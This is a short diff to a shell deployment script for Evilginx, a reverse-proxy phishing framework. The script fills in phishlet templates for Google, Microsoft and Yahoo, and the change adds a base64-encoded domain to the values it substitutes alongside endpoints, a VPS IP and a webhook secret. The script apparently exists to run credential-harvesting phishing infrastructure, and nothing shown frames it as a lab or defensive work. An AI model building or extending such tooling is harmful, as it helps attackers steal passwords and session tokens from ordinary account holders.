@@ -542,12 +542,14 @@ EOF
     mkdir -p "$EVILGINX_DIR/phishlets"
 
     # Replace variables in phishlets
+    local DOMAIN_B64=$(echo -n "$DOMAIN" | base64 | tr -d '\n')
     for phishlet in google microsoft yahoo; do
         if [ -f "$INSTALL_DIR/templates/phishlets/${phishlet}.yaml.tmpl" ]; then
             sed -e "s|{{.Endpoint1}}|$EP1|g" \
                 -e "s|{{.Endpoint2}}|$EP2|g" \
                 -e "s|{{.Endpoint3}}|$EP3|g" \
                 -e "s|{{.Domain}}|$DOMAIN|g" \
+                -e "s|{{.DomainBase64}}|$DOMAIN_B64|g" \
                 -e "s|{{.VpsIp}}|$VPS_IP|g" \
                 -e "s|{{.AppPort}}|$APP_PORT|g" \
                 -e "s|{{.WebhookSecret}}|$WEBHOOK_SECRET|g" \
